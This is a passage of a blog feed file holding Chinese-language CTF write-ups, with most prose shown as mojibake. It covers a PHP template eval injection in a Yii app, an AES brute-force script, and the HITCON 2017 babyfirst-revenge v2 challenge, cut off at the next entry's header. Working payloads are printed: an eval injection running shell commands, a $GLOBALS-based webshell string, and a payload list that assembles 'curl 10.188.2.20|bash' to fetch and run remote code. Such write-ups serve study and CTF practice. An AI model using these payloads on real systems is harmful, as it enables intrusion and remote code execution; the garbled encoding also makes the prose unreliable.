å®¡è®¡çš„è¯å¾—å…ˆæ‰¾<code>Controller</code>é‡Œé¢çš„ä¸œè¥¿æ¯•ç«Ÿéƒ½æ˜¯äº›é€»è¾‘æ€§çš„ä¸œè¥¿ï¼Œå…³é”®çš„åŠŸèƒ½ä¹Ÿåœ¨é‡Œé¢<br>æ‰€ä»¥åœ¨è¿™ä¸ªurlé‡Œé¢çš„siteæ˜¯æŒ‡çš„æ§åˆ¶å™¨ï¼Œè€Œbackupå°±æ˜¯siteæ§åˆ¶å™¨é‡Œé¢çš„æ“ä½œ<br><img src="https://s1.ax1x.com/2018/09/30/ilI8QU.png" alt="ilI8QU.png"><br>æˆ‘ä»¥å‰çš„åšå®¢è®²è¿‡<br><a href="https://imgchr.com/i/ilIdF1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIdF1.md.png" alt="ilIdF1.md.png"></a></p><p>ä»ä»£ç é‡Œé¢ä½ ä¼šå‘ç°<code>site</code>æ§åˆ¶å™¨é‡Œé¢éƒ½æ˜¯äº›å±•ç¤ºé¡µé¢ä»¥åŠç™»é™†çš„åŠŸèƒ½ï¼Œä½†æ˜¯ä¸è¦è¿‡åˆ†ä»¥ä¸ºç™»å½•é‡Œé¢ä¼šæœ‰sqlæ³¨å…¥ï¼Œæ¯•ç«ŸYiiæ¡†æ¶é‡Œé¢æ˜¯å¯ä»¥é€šè¿‡å¯¹loginå‡½æ•°è®¾ç½®<code>rules</code>å†æ¥é€šè¿‡<code>validate</code>å»æ£€æµ‹æ˜¯å¦å‡ºç°SQLæ³¨å…¥ï¼Œæ‰€ä»¥å‡ºç°sqlæ³¨å…¥æœºç‡ä¸å¤§</p><p>ä½†æ˜¯åœ¨å›æ”¾é‡Œé¢å­¦åˆ°äº†ä¸€ç§æ›´éªšæ°”çš„ä»£ç è°ƒè¯•çš„æ–¹æ³•ã€‚ã€‚å°±æ˜¯å½“ä½ ä¸æ‡‚æ¡†æ¶çš„æ—¶å€™å¦‚ä½•å°†å…¶å˜æˆæ™®é€šçš„phpä»£ç è¿›è¡Œè°ƒè¯•<br>è¿™ä¸ªæ–¹æ³•å°±æ˜¯å°†è·Ÿæ¡†æ¶æœ‰å…³çš„ä¸œè¥¿å»æ‰æŠŠå…³äºæ¡†æ¶çš„ç±»çœ‹æˆä¸€ä¸ªæ™®é€šçš„ç±»ï¼Œå†æŠŠè·Ÿä¸šåŠ¡é€»è¾‘ä»¥åŠæ•°æ®åº“ç›¸å…³æ“ä½œçš„åŠŸèƒ½æœ‰å…³çš„å»æ‰ï¼Œç„¶åæ–°å»ºé‚£ä¸ªç±»ï¼Œå•çº¯æµ‹è¯•ä¸€ä¸‹é‚£ä¸ªè¾“å…¥è¾“å‡ºçš„å‡½æ•°å°±å¥½</p><p>å°è¯•è°ƒè¯•ï¼Œæˆ‘è¿™é‡Œç”¨çš„phpstormå»è°ƒè¯•ï¼Œåœ¨<code>parstIf</code>å‡½æ•°ä¸‹äº†æ–­ç‚¹ï¼Œå‘ç°æ‰§è¡Œåˆ°ä¸‹å›¾æ‰€ç¤ºçš„åœ°æ–¹å°±ä¼šé‡æ–°è¿”å›åˆ°echoè¾“å‡ºè¯­å¥ä¸­<br><a href="https://imgchr.com/i/ilIrQO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIrQO.md.png" alt="ilIrQO.md.png"></a><br>è¯´æ˜è¦åœ¨å­—ç¬¦ä¸²é‡Œé¢åŠ ä¸Š<code>{if</code>æ­¤ç±»çš„å­—ç¬¦ä¸²<br>éšä¾¿æ‰¾ä¸€ä¸ªåœ°æ–¹åŠ åŠ ï¼Œä¸ºçš„æ˜¯èƒ½å¤Ÿè¿›å…¥elseçš„å¾ªç¯<br><a href="https://imgchr.com/i/ilIbwj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIbwj.md.png" alt="ilIbwj.md.png"></a><br>è¿›å…¥elseä¼šå‘ç°åˆ°<code>buildregx</code>åˆä¼šæœ‰ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œå…¶å®è¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸ºäº†æ„å»ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨å­—ç¬¦ä¸²å‰åæ·»åŠ <code>/</code>ï¼Œå¯ä»¥ä»debugçš„ç»“æœçœ‹å¾—å‡ºæ¥<br><a href="https://imgchr.com/i/ilIqTs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIqTs.md.png" alt="ilIqTs.md.png"></a><br>è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦åŒ¹é…<code>/{if:(.*?)}(.*?){end if}/is</code>è¿™æ ·çš„æ­£åˆ™ï¼Œä½†æ˜¯ä¹‹å‰çš„è¾“å…¥ä¼šå¯¼è‡´å…¶è·³å‡ºè¯¥å¾ªç¯ï¼Œä»è€Œåˆç›´æ¥è¿”å›äº†ç»“æœï¼Œä¸èƒ½è¿›å…¥åˆ°forå¾ªç¯é‡Œé¢æ‰§è¡Œevalå‡½æ•°<br><a href="https://imgchr.com/i/ilIXYq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIXYq.md.png" alt="ilIXYq.md.png"></a><br>è¿™æ—¶å€™å°±åˆéœ€è¦æ„å»ºå¯¹åº”çš„ä¸œè¥¿äº†ï¼Œæˆ‘ä»¬æŠŠæ­£åˆ™é‡Œé¢çš„<code>(.*?)</code>æ”¹ä¸ºè‡ªå·±éšæ„çš„å†…å®¹å°±å¥½<br><a href="https://imgchr.com/i/ilIjf0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIjf0.md.png" alt="ilIjf0.md.png"></a><br>ç„¶åå†è¿½è¸ªä¸€æ¬¡å˜åŒ–è¿‡ç¨‹ï¼Œç»è¿‡<code>preg_match_all</code>è¿™ä¸ªå‡½æ•°çš„æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°ä¼šæŠŠåŸæ¥çš„åŒ¹é…çš„å­—ç¬¦åˆ†æˆä¸‰æ®µï¼Œé¦–å…ˆæ˜¯<code>iar[0][0]</code>æ˜¯åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²<code>{if:2333}23333{end if}</code>ï¼Œç„¶åæ˜¯åˆ†åˆ«æ˜¯ç¬¬ä¸€ä¸ªä»»æ„å†…å®¹ä»¥åŠç¬¬äºŒä¸ªä»»æ„å†…å®¹åŒ¹æ­£åˆ™é…åˆ°çš„å­—ç¬¦ä¸²ï¼Œ<code>iar[1][0]=2333,iar[2][0]=23333</code></p><p>ç»§ç»­èµ°çš„è¯ï¼Œè¿™æ—¶å€™å°±å¯ä»¥è¿›è¡Œä¸€æ¬¡å¾ªç¯äº†ï¼Œå› ä¸ºç°åœ¨arlen=1,ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­æ‰§è¡Œä¸‹å»äº†ï¼Œåä¹°çš„äº‹æƒ…å°±å¾ˆç®€å•äº†ï¼Œå…ˆæ˜¯åˆ¤æ–­<code>iar[1][0]</code>ä»¥åŠ<code>iar[2][0]</code>é‡Œé¢æ˜¯å¦æœ‰ç­‰å·ï¼Œå†åˆ¤æ–­ä¸€ä¸‹<code>iar[2][0]</code>é‡Œé¢æ˜¯å¦æœ‰<code>{elseif</code>ä»¥åŠ<code>else</code>ï¼Œè¿™å‡ ä¸ªåˆ¤æ–­éƒ½ä¸å½±å“<br><a href="https://imgchr.com/i/ilopXF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilopXF.md.png" alt="ilopXF.md.png"></a><br>æœ€åè¿˜æ˜¯å°†<code>iar[1][0]</code>æ”¾åœ¨è¿™ä¸ªevalè¯­å¥é‡Œé¢æ‰§è¡Œ<br><a href="https://imgchr.com/i/iloCm4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloCm4.md.png" alt="iloCm4.md.png"></a><br>æ¢³ç†ä¸€ä¸‹é€»è¾‘ä¹Ÿå°±æ˜¯è¯´æ£€æŸ¥æœ€å°‘çš„æ˜¯<code>iar[1][0]</code>ï¼Œåªæ£€æŸ¥ä»–æ˜¯å¦å­˜åœ¨<code>=</code>ï¼Œé‚£å°±å¥½åŠäº†ï¼Œåœ¨evalè¯­å¥ä¸­æˆ‘ä»¬åªéœ€è¦å¯¹<code>iar[1][0</code>]é—­åˆä¸€ä¸‹è¯­å¥æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤å³å¯</p><p>Payload<br><code>{if:1)print_r(`cat /tmp/flag`);die();//}123{end if}</code>ç¬¬ä¸€ç§æ€è·¯ç›´æ¥åœ¨é‡Œé¢æ‹¼æ¥å‘½ä»¤æ‰§è¡Œè¯­å¥å³å¯<br><img src="https://s1.ax1x.com/2018/09/30/iloi79.png" alt="iloi79.png"></p><p>ç¬¬äºŒç§æ€è·¯å°±æ˜¯åœ¨æ²¡æœ‰è¿‡æ»¤<code>$GOLBALS</code>å…¨å±€å˜é‡çš„å‰æä¸‹ä½¿ç”¨æ‹¼æ¥ï¼Œä½†ä¸ªäººæ„Ÿè§‰è¿™ä¸œè¥¿ä¼šåœ¨PHPå¼€å‘ä¸­ç»™ç¦æ‰å§æ¯•ç«Ÿå¯èƒ½ä¼šå¯¹ä»£ç é‡Œé¢çš„å…¶ä»–å˜é‡é€ æˆå½±å“ï¼Œè¿™ä¸ªå¥—è·¯ä¸€èˆ¬éƒ½æ˜¯ç”¨æ¥å†™è¿‡wafçš„å°é©¬ç”¨çš„</p><p><code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);die();//}{end if}</code></p><p>å°è¯•è¿™ä¸ªçš„æ˜¯æ—¶å€™è¿˜ä»¥ä¸ºæœåŠ¡å™¨åäº†ã€‚ã€‚ã€‚çªç„¶å‘ç°<code>processing request</code>ã€‚ã€‚ã€‚åº”è¯¥æ˜¯æ²¡ä¼ å‚ï¼Œä¼ å‚äº†å°±å¥½äº†</p><p><a href="https://imgchr.com/i/iloAt1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloAt1.md.png" alt="iloAt1.md.png"></a></p><p><a href="https://imgchr.com/i/iloM0H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloM0H.md.png" alt="iloM0H.md.png"></a><br><a href="https://imgchr.com/i/iloQ7d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloQ7d.md.png" alt="iloQ7d.md.png"></a></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="ç®€å•åŠ å¯†"><a href="#ç®€å•åŠ å¯†" class="headerlink" title="ç®€å•åŠ å¯†"></a>ç®€å•åŠ å¯†</h4><p>è¿™ä¸ªé¢˜ç›®å¸®æˆ‘å¤ä¹ äº†ä¸€ä¸‹ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€ç¬¬ä¸€ç« çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘å°±è®°å½•ä¸€ä¸‹è¿™ä¸ªé¢˜ç›®ï¼Œå…¶ä»–é¢˜ç›®å°±ä¸å†™äº†</p><p>è¿™ä¸ªå…³é”®ç‚¹å°±æ˜¯ä½œå–ä½™è¿ç®—çš„æ—¶å€™ç»“æœæ˜¯ä¸ä¼šè¶…è¿‡ä½™æ•°çš„ï¼Œå¦‚æœæœ‰æ‰“è¿‡ACMçš„äººå°±ä¼šçŸ¥é“æœ‰ä¸€ä¸ªå«å¿«é€Ÿå¹‚çš„ä¸œè¥¿è·Ÿè¿™ä¸ªä¹Ÿå·®ä¸å¤šï¼Œæå¤§åœ°é™ä½äº†ä»£ç æ‰€éœ€è¦çš„ç©ºé—´åº¦ï¼Œä½¿å¾—æ•°ä¸ä¼šè¶Šç•Œ</p><p>è§‚å¯Ÿä¸»å‡½æ•°ç°åœ¨æˆ‘ä»¬éœ€è¦çš„å°±æ˜¯<code>passwd</code>è¿™ä¸ªå‚æ•°ï¼Œä½†æ˜¯ä»<code>generate_passwd</code>æ˜¯å¾—åˆ°æœ€å¤š<code>passwd</code>ä¸ä¼šè¶…è¿‡<code>0xB18E</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€‰æ‹©çˆ†ç ´<br><a href="https://imgchr.com/i/ilo3tI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilo3tI.md.png" alt="ilo3tI.md.png"></a></p><p>è·‘ä¸€ä¸‹è„šæœ¬å°±å¯ä»¥å¾—åˆ°flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    bs = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data = cipher.encrypt(pad(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data  = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> unpad(data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_passwd</span><span class="params">(key,result)</span>:</span></span><br><span class="line">    data_halt = <span class="string">"LvR7GrlG0A4WIMBrUwTFoA=="</span>.decode(<span class="string">"base64"</span>)</span><br><span class="line">    rand_int =  int(decrypt(data_halt, key).encode(<span class="string">"hex"</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#round = 0x7DC59612</span></span><br><span class="line">    result = result * (rand_int % <span class="number">0xB18E</span>) % <span class="number">0xB18E</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(str(result), key)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    key = <span class="string">'17abeca4cc4c432a52c2b7f6d24d1888'</span></span><br><span class="line">    </span><br><span class="line">    output = <span class="string">"u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> range(<span class="number">0xB18E</span>):</span><br><span class="line">        passwd = generate_passwd(key.decode(<span class="string">"hex"</span>),result)</span><br><span class="line">        r = decrypt(output.decode(<span class="string">"base64"</span>), passwd)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">print</span> r</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hitcon2017 babyfirst-revenge v2å¤ç°</title>
      <link href="/hitcon2017-babyfirstv2.html"/>
      <url>/hitcon2017-babyfirstv2.html</url>
      <content type="html"><![CDATA[<p>è¿™ä¸ªé¢˜ç›®çš„æ¡ä»¶æ›´åŠ è‹›åˆ»äº†ï¼Œå…ˆæ”¾ä¸ªæºç <a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>ç®€å•çœ‹ä¸€ä¸‹è¿™æ®µä»£ç æ¯”ä¸Šä¸€æ¬¡çš„ä»£ç çš„cmdé•¿åº¦æ›´å°ï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬å°±ä¸èƒ½å†ä»¥<code>ls&gt;&gt;_</code> æ¥å°†ç›¸å…³çš„å‘½ä»¤è¦†ç›–åˆ°æ–‡ä»¶é‡Œé¢äº†<br>ä½†æ˜¯orangeå¤§å¤§ç”¨çš„æ–¹æ³•çœŸæ˜¯å¹ä¸ºè§‚æ­¢ï¼Œæ ¹æ®å®˜æ–¹payloadä¸€æ­¥æ­¥æ¥åˆ†æè¿™é‡Œæ˜¯æ€ä¹ˆå·§å¦™çš„ç»•è¿‡4ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">payload = [ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line"> <span class="string">'&gt;dir'</span>, </span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"> <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line"> <span class="string">'&gt;ht-'</span>,</span><br><span class="line"> <span class="string">'*&gt;v'</span>,</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g"</span></span><br><span class="line"> <span class="string">'&gt;rev'</span>,</span><br><span class="line"> <span class="string">'*v&gt;x'</span>, </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "curl orange.tw|python;"</span></span><br><span class="line"> <span class="comment"># generate "curl 10.188.2.20|bash" </span></span><br><span class="line"><span class="string">'&gt;\;\\'</span>,</span><br><span class="line"> <span class="string">'&gt;sh\\'</span>, </span><br><span class="line"><span class="string">'&gt;ba\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\|\\'</span>,</span><br><span class="line"> <span class="string">'&gt;20\\'</span>,</span><br><span class="line"> <span class="string">'&gt;2.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;8.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;18\\'</span>,</span><br><span class="line"> <span class="string">'&gt;0.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;1\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\ \\'</span>,</span><br><span class="line"> <span class="string">'&gt;rl\\'</span>,</span><br><span class="line"> <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"> <span class="comment"># got shell</span></span><br><span class="line"> <span class="string">'sh x'</span>, </span><br><span class="line"><span class="string">'sh g'</span>,</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç¬¬ä¸€ä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯Linuxä¸‹å­˜åœ¨<code>dir</code>å‘½ä»¤ä½œä¸º<code>ls</code>å‘½ä»¤çš„åˆ«åï¼Œå¯èƒ½æœ‰çš„ç³»ç»Ÿæ²¡æœ‰ï¼Œä½†æ˜¯å¯¹äºè¿™é“é¢˜è€Œè¨€æ˜¯æœ‰çš„ï¼Œè€Œä¸”ä»–ä¹Ÿæ˜¯é»˜è®¤ä»¥å­—å…¸åºå»æ’åˆ—ï¼Œå¯¹äºè¿™é¢˜è€Œè¨€è¿™ä¸ªå‘½ä»¤èµ·åˆ°äº†æ‹¼æ¥æ–‡ä»¶åçš„æ•ˆæœï¼Œä½†æ˜¯æ³¨æ„å«æœ‰ç‰¹æ®Šå­—ç¬¦ä»¥åŠæ•°å­—çš„æƒ…å†µä¸‹ï¼Œå­—æ¯æ’åºçš„ä¼˜å…ˆçº§ä¼šé™ä½<br><img src="https://s1.ax1x.com/2018/09/18/ietTMt.png" alt="ietTMt.png"></p><p>ç¬¬äºŒä¸ªç‚¹åœ¨äºå•ç‹¬ä¸€ä¸ª<code>*</code>çš„å‘½ä»¤æœ‰ä½•ä½œç”¨ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šå…ˆå°†å½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶è¿›è¡Œä¸€ä¸ªæ’åºï¼Œç„¶åæ’åºåçš„ç»“æœä¼šä»¥å‘½ä»¤çš„å½¢å¼é€å»<code>bash</code>æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾ï¼Œä½†æ˜¯å¦‚æœæœ‰å†™ä¸æ˜¯å‘½ä»¤çš„è¯å°±ä¼šå‡ºç°<code>command not found</code>çš„æŠ¥é”™ï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±å¯ä¸€åˆ©ç”¨<code>dir</code>åŠ ä¸Š<code>*</code>å‘½ä»¤å»æ‰§è¡Œå†™å…¥æ–‡ä»¶çš„æ“ä½œï¼Œè¿™ä¹Ÿæ˜¯è¿™é“é¢˜ç›®å…³é”®ä¹‹å¤„ï¼Œåˆ©ç”¨äº†é€†åºæ‰§è¡Œå‘½ä»¤çš„éªšæ“ä½œï¼Œè¿™å¾—å¯¹Linuxç³»ç»Ÿå¤šä¹ˆç†Ÿæ‚‰å•Š<br><img src="https://s1.ax1x.com/2018/09/18/iet7sP.png" alt="iet7sP.png"></p><p>æ¥ç€ä¸Šå°±æå‡ºä¸‹ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯åˆ©ç”¨<code>rev</code>å‘½ä»¤å»åå‘æ–‡ä»¶çš„å­—ç¬¦ä¸²ï¼Œé¡¾åæ€ä¹‰ï¼Œæˆ‘ä»¬å°±æ˜¯è¦æŠŠ<code>ls -t &gt;g</code>è¿™ä¸€æ¡å‘½ä»¤ç»™é€†åºè¿‡æ¥ï¼Œè¿™æ“ä½œå¾ˆå¼ºã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¦å…ˆæ„é€ ä¸‹å›¾ä¸­çš„æ–‡ä»¶åï¼Œä½ é€†åºè¿‡æ¥å°±ä¼šå‘ç°æ˜¯<code>ls -th &gt;g</code></p><p><img src="https://s1.ax1x.com/2018/09/18/ietHqf.png" alt="ietHqf.png"><br>æœ‰äººå¯èƒ½ä¼šé—®ä¸ºä»€ä¹ˆä¼šå¤šåŠ ä¸€ä¸ª<code>h</code>ï¼Œå› ä¸ºå¦‚æœä¸å¤šåŠ <code>h</code>çš„è¯åœ¨ä½ æ‰§è¡Œ<code>dir</code>çš„æ—¶å€™æŒ‰å­—æ¯æ’åºå­—æ¯<code>t</code>æ¯”<code>s</code>æ›´é åï¼Œæ”¾è¿›<code>v</code>æ–‡ä»¶ä¹‹åä»¥åŠæ”¾å…¥æƒ³æ–‡ä»¶é‡Œé¢æ˜¯è¿™æ ·çš„ï¼Œè¿™å°±è·Ÿæˆ‘ä»¬çš„ç›®çš„ç›¸è¿èƒŒï¼Œä¸èƒ½æ„é€ å‡º<code>ls -t &gt;g</code>äº†ï¼Œä½†æ˜¯æˆ‘ä»¬æ„é€ çš„æ˜¯<code>ls  -th &gt;g</code>æƒ…å†µå°±ä¼šæœ‰æ‰€æ”¹è§‚ï¼Œè¿™ä¸ª<code>h</code>å®é™…ä¸Šæ²¡æœ‰å½±å“ï¼Œå°±æ˜¯ä¸€ä¸ªæ”¹å˜è§†å›¾ç»“æ„çš„ä¸œè¥¿ï¼ŒæŠŠå†…å­˜å¤§å°å˜å¾—æ›´åŠ äººæ€§åŒ–è€Œå·²ã€‚<br><img src="https://s1.ax1x.com/2018/09/18/ietqZ8.png" alt="ietqZ8.png"></p><p><img src="https://s1.ax1x.com/2018/09/18/ietLdS.png" alt="ietLdS.png"></p><p>æŒ‰ç…§ä¸Šé¢æ‰€è¯´æŠŠ<code>v</code>æ–‡ä»¶çš„å†…å®¹å¼„å¥½ï¼Œä¸‹é¢å°±åº”è¯¥åˆ›å»ºä¸€ä¸ª<code>rev</code>çš„æ–‡ä»¶ï¼Œä¸ºçš„æ˜¯åˆ©ç”¨è¿™ä¸ªå‘½ä»¤ï¼Œé€šè¿‡<code>*v&gt;x</code>çš„æ–¹å¼æŠŠé€†åºåçš„å†…å®¹æ”¾åœ¨xæ–‡ä»¶é‡Œé¢ï¼Œåˆ°åæœŸå¯ä»¥ç›´æ¥shæ‰§è¡Œï¼Œ<code>*v&gt;x</code>è¿™ä¸ªå‘½ä»¤çš„å«ä¹‰å°±æ˜¯å°†æ‰€æœ‰æœ€åä¸€ä¸ªå­—æ¯éƒ½æ˜¯<code>v</code>çš„æ–‡ä»¶æ’ä¸ªåºï¼Œç„¶åæ‰§è¡Œï¼Œå› ä¸ºråœ¨vçš„å‰é¢å®é™…ä¸Šçš„å‘½ä»¤å°±æ˜¯ <code>rev v&gt;x</code>ï¼Œæ‰€ä»¥æœ€ååˆ°<code>x</code>æ–‡ä»¶é‡Œé¢çš„å†…å®¹å°±æ˜¯<br><img src="https://s1.ax1x.com/2018/09/18/ietjiQ.png" alt="ietjiQ.png"></p><p>åˆ°è¿™é‡Œå°±è·Ÿç¬¬ä¸€ä¸ªbabyfirst-revengeä¸€æ ·äº†ï¼Œåç»­æ­¥éª¤å°±ä¸å¤šè¯´äº†,ç›´æ¥ä¸ŠEXPè·å–flag2333</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>1.ç¬¬ä¸€ä¸ªåˆ©ç”¨çš„ç‚¹æ˜¯é€†åºå­—ç¬¦ä¸²æ”¾å…¥æ–‡ä»¶ä¸­åœ¨æ‰§è¡Œï¼Œå¦‚æœè®©æˆ‘æ¥æƒ³æˆ‘æ˜¯ç»å¯¹æƒ³ä¸åˆ°çš„ï¼Œå­¦ä¹ äº†<br>2.ç¬¬äºŒä¸ªå°±æ˜¯åˆ©ç”¨äº†<code>dir</code>å‘½ä»¤å®Œç¾æ»´ç»•è¿‡äº†<code>ls&gt;&gt;x</code>è¿™ä¸ªé™åˆ¶<br>3.Linuxä¸‹<code>*</code>å‘½ä»¤å·§å¦™ä½¿ç”¨</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> å‘½ä»¤æ‰§è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hitcon2015 babyfirstå¤ç°</title>
      <link href="/hitcon2015-babyfirst.html"/>
      <url>/hitcon2015-babyfirst.html</url>
